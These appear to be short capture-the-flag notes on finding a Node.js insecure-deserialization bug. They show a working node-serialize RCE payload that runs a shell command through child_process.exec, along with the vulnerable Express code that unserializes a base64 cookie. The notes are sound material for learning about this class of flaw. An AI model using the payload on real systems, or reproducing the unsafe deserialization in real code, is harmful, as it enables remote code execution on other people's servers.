Missed

1. Sending `/` gave a base64 cookie
2. We can change it's value and the response was reflected which suggests some internal parsing
3. Upon more inpsection it was found vulnerable to nodejs deserialisation [payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Node.md):

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}()"}
```

vulnerable code

```js
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var path = require('path');
var app = express();
app.use(cookieParser())
app.set('view engine',  'pug');

app.use('/css', express.static('css'));
app.use('/img', express.static('img'));

app.get('/', function(req, res) {
 if (req.cookies.session) {
   var str = new Buffer(req.cookies.session, 'base64').toString();
   var obj = serialize.unserialize(str);
   if (obj.username) {
     var username2 = JSON.stringify(obj.username).replace(/[^0-9a-z]/gi, '');
     obj.username = username2
     res.render('../index', {username: obj.username})
   }
 } else {
     res.cookie('session', "eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ==", {
       maxAge: 1200000,
       httpOnly: true
     });
 }
res.render('../index', {username: "Guest"});
});

app.get('/login', function(req, res) {
        res.sendFile(path.join(__dirname+'/login.html'));
});
app.listen(8080);
```
